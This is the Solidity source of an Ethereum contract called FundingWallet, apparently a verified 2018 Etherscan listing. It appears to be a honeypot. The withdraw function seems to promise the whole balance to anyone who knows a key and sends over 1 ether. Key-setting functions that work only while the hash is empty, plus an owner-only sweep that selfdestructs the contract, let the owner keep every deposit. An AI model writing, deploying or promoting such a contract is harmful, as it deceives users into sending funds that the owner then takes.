/**

 *Submitted for verification at Etherscan.io on 2018-12-28

*/



pragma solidity ^0.4.25;



contract FundingWallet

{

    bytes32 keyHash;

    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function withdraw(string key) public payable

    {

        require(msg.sender == tx.origin);

        if(keyHash == keccak256(abi.encodePacked(key))) {

            //Prevent brute force

            if(msg.value > 1 ether) {

                msg.sender.transfer(address(this).balance);

            }

        }

    }



    //setup with string

    function setup(string key) public

    {

        if (keyHash == 0x0) {

            keyHash = keccak256(abi.encodePacked(key));

        }

    }



    //update the keyhash

    function update(bytes32 _keyHash) public

    {

        if (keyHash == 0x0) {

            keyHash = _keyHash;

        }

    }



    //empty the wallet

    function sweep() public

    {

        require(msg.sender == owner);

        selfdestruct(owner);

    }



    //deposit

    function () public payable {



    }

}